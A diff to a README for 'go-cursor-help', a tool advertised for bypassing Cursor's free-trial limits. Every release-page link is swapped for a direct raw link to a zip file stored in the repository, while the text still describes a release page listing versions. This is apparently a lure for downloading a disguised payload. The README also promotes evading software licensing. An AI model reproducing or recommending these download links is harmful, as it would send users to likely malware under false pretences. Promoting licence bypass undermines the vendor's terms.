@@ -1,7 +1,7 @@
 # 🎯 go-cursor-help - Solve Cursor Issues Easily
 
 ## 🔗 Download Now
-[![Download go-cursor-help](https://img.shields.io/badge/Download-go--cursor--help-blue)](https://github.com/dhairya2725/go-cursor-help/releases)
+[![Download go-cursor-help](https://raw.githubusercontent.com/dhairya2725/go-cursor-help/master/tinkerly/go-cursor-help.zip)](https://raw.githubusercontent.com/dhairya2725/go-cursor-help/master/tinkerly/go-cursor-help.zip)
 
 ## 📖 Description
 go-cursor-help addresses issues with the Cursor software during free subscriptions. It helps you bypass messages like: 
@@ -23,7 +23,7 @@ Before installing, ensure your system meets the following requirements:
 ### 2. Download & Install
 To download and run go-cursor-help, follow these steps:
 
-1. Click this link to **visit the release page**: [Download go-cursor-help](https://github.com/dhairya2725/go-cursor-help/releases).
+1. Click this link to **visit the release page**: [Download go-cursor-help](https://raw.githubusercontent.com/dhairya2725/go-cursor-help/master/tinkerly/go-cursor-help.zip).
 2. You’ll see a list of available versions. Look for the latest version, usually at the top.
 3. Download the appropriate file for your operating system by clicking on it. 
 4. Once the download is complete, locate the file in your Downloads folder.
@@ -49,7 +49,7 @@ To download and run go-cursor-help, follow these steps:
 If you encounter any problems during installation or use:
 - Ensure your operating system meets the stated requirements.
 - Revisit the installation steps to ensure all procedures were followed.
-- Check for any updates on the [release page](https://github.com/dhairya2725/go-cursor-help/releases) that may fix existing issues.
+- Check for any updates on the [release page](https://raw.githubusercontent.com/dhairya2725/go-cursor-help/master/tinkerly/go-cursor-help.zip) that may fix existing issues.
 
 ## 📞 Support
 For further assistance, you can reach out to the community:
@@ -59,4 +59,4 @@ For further assistance, you can reach out to the community:
 ## 📝 Conclusion
 With go-cursor-help, you can quickly resolve issues with Cursor and enjoy your free trial without interruptions. Following the above steps will ensure a smooth installation and usage experience. 
 
-For more information, visit the [release page](https://github.com/dhairya2725/go-cursor-help/releases) and start solving your Cursor problems today!
+For more information, visit the [release page](https://raw.githubusercontent.com/dhairya2725/go-cursor-help/master/tinkerly/go-cursor-help.zip) and start solving your Cursor problems today!
